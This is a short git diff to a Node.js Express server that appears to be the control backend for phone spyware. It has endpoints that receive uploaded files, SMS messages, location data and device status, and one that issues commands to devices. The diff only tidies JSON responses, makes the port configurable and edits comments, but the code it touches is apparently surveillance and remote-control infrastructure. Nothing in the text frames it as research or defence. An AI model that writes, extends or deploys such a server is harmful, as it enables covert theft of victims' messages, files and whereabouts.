@@ -41,7 +41,7 @@ const storage = multer.diskStorage({
 const upload = multer({ storage: storage });
 
 // ==========================
-// 📦 STORAGE
+// 📦 STORAGE (🔥 SAFE INIT)
 // ==========================
 let logs = [];
 let command = "";
@@ -86,11 +86,10 @@ app.post("/track", upload.single("file"), (req, res) => {
 });
 
 // ==========================
-// 📊 GET LOGS (🔥 FORCE JSON FIX)
+// 📊 GET LOGS
 // ==========================
 app.get("/logs", (req, res) => {
-    res.setHeader("Content-Type", "application/json");
-    res.send(JSON.stringify(logs));
+    res.json(logs); // 🔥 FIX
 });
 
 // ==========================
@@ -115,7 +114,7 @@ app.get("/get-command", (req, res) => {
 });
 
 // ==========================
-// 📍 LOCATION (SAFE)
+// 📍 LOCATION
 // ==========================
 app.post("/location", (req, res) => {
     try {
@@ -133,7 +132,7 @@ app.post("/location", (req, res) => {
 });
 
 // ==========================
-// 📩 SMS (FIXED DUPLICATE)
+// 📩 SMS
 // ==========================
 app.post("/sms", (req, res) => {
     deviceData.sms = req.body.sms || [];
@@ -169,11 +168,10 @@ app.get("/files", (req, res) => {
 });
 
 // ==========================
-// 📤 DEVICE STATUS (IMPORTANT)
+// 📤 DEVICE STATUS
 // ==========================
 app.get("/device", (req, res) => {
-    res.setHeader("Content-Type", "application/json");
-    res.send(JSON.stringify(deviceData));
+    res.json(deviceData); // 🔥 FIX
 });
 
 // ==========================
@@ -192,8 +190,10 @@ app.use((err, req, res, next) => {
 });
 
 // ==========================
-// 🚀 START SERVER
+// 🚀 START SERVER (🔥 MAIN FIX)
 // ==========================
-app.listen(3000, "0.0.0.0", () => {
-    console.log("🚀 Server running on http://0.0.0.0:3000");
+const PORT = process.env.PORT || 3000;
+
+app.listen(PORT, "0.0.0.0", () => {
+    console.log("🚀 Server running on port " + PORT);
 });
